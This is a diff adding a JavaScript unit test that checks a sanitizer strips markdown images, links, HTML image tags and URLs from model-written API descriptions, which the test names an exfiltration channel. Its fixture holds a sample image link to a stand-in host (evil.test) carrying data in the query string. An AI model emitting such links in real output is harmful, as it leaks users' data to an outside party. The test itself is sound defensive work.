@@ -178,3 +178,11 @@ test('two consecutive failures stop the run; a success in between resets the cou
   assert.ok(flaky.calls.length > 2, 'alternating failures never reach 2 in a row');
   assert.ok(!/consecutive/.test(r2.warnings.join(' ')));
 });
+
+test('sanitizeAnswer strips images, links and URLs from model text (exfiltration channel)', () => {
+  const out = sanitizeAnswer([{ id: 'a', params: [{ name: 'q', in: 'query' }] }], [
+    { id: 'a', description: 'Hi ![t](https://evil.test/p.png?d=orders) <img src=x> there', params: [{ in: 'query', name: 'q', description: 'See [here](https://evil.test) https://evil.test/z' }] },
+  ]);
+  assert.equal(out.a.description, 'Hi t there');
+  assert.equal(out.a.params['query:q'], 'See here');
+});
